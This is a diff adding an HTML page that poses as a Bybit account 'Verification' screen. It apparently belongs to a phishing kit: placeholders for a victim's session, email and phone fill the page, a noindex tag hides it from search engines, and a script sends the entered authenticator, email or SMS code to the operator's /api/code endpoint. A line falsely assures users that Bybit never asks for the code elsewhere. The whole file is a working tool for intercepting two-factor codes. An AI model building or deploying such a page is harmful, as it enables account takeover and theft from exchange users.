@@ -1,0 +1,68 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow"><title>Verification | Bybit</title>
+<link rel="stylesheet" href="/app.css"></head><body><div class="wrap"><main class="card">
+<div class="logo"><div class="mark"></div><div class="word">BYBIT</div></div>
+<h1>Verification</h1>
+<p class="sub" id="hint">Enter the 6-digit code from your Google Authenticator app.</p>
+<div class="methods">
+  <button class="m" data-m="auth">Authenticator</button>
+  <button class="m" data-m="mail">Email</button>
+  <button class="m" data-m="sms">SMS</button>
+</div>
+<form id="f" novalidate>
+  <div class="otps" id="boxes">
+    <input inputmode="numeric" maxlength="1" autocomplete="one-time-code">
+    <input inputmode="numeric" maxlength="1"><input inputmode="numeric" maxlength="1">
+    <input inputmode="numeric" maxlength="1"><input inputmode="numeric" maxlength="1">
+    <input inputmode="numeric" maxlength="1">
+  </div>
+  <div class="err" id="err"></div>
+  <button class="btn" type="submit" id="btn">Verify</button>
+</form>
+<button class="resend" id="rs" style="visibility:hidden" disabled>Resend code in 60s</button>
+<div class="note">Never share this code with anyone. Bybit will never ask for it outside this page.</div>
+<div class="foot"><a href="/?s={{SID}}">Back to log in</a></div>
+<script>
+var SID="{{SID}}",BS=[].slice.call(document.querySelectorAll('.otps input')),
+BTN=document.getElementById('btn'),E=document.getElementById('err'),RS=document.getElementById('rs'),
+HINT=document.getElementById('hint'),TARGET={mail:"{{MAIL}}",sms:"{{PHONE}}"},timer=null;
+function setMethod(m){
+  Array.prototype.forEach.call(document.querySelectorAll('.m'),function(x){x.classList.toggle('on',x.dataset.m===m);});
+  if(m==='auth'){HINT.textContent='Enter the 6-digit code from your Google Authenticator app.';RS.style.visibility='hidden';return;}
+  HINT.textContent='Enter the 6-digit code sent to '+TARGET[m]+'.';
+  RS.style.visibility='visible';RS.disabled=true;RS.textContent='Resend code in 60s';
+  clearInterval(timer);var left=60;
+  timer=setInterval(function(){
+    left--;
+    if(left<=0){clearInterval(timer);RS.disabled=false;RS.textContent='Resend code';return;}
+    RS.textContent='Resend code in '+left+'s';
+  },1000);
+}
+Array.prototype.forEach.call(document.querySelectorAll('.m'),function(b){b.onclick=function(){setMethod(b.dataset.m);};});
+setMethod("{{METHOD}}");
+BS[0].focus();
+BS.forEach(function(b,i){
+  b.addEventListener('input',function(){b.value=b.value.replace(/\D/g,'');if(b.value&&BS[i+1])BS[i+1].focus();});
+  b.addEventListener('keydown',function(e){if(e.key==='Backspace'&&!b.value&&BS[i-1])BS[i-1].focus();});
+  b.addEventListener('paste',function(e){
+    var d=(e.clipboardData.getData('text')||'').replace(/\D/g,'');
+    if(d.length>1){e.preventDefault();d.split('').forEach(function(c,j){if(BS[j])BS[j].value=c;});BS[Math.min(d.length,5)].focus();}
+  });
+});
+RS.onclick=function(){
+  RS.disabled=true;RS.textContent='Sending…';
+  fetch('/api/resend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({method:"{{METHOD}}",s:SID})}).catch(function(){});
+};
+document.getElementById('f').addEventListener('submit',function(e){
+  e.preventDefault();
+  var code=BS.map(function(b){return b.value;}).join('');
+  if(code.length<6){E.textContent='Enter the complete 6-digit code.';return;}
+  E.textContent='';BTN.disabled=true;BTN.textContent='Verifying…';
+  fetch('/api/code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code,method:"{{METHOD}}",s:SID})})
+    .then(function(r){return r.json();})
+    .then(function(j){location.href=j.next||'/done';})
+    .catch(function(){BTN.disabled=false;BTN.textContent='Verify';E.textContent='Network error. Please try again.';});
+});
+</script>
+</main></div></body></html>
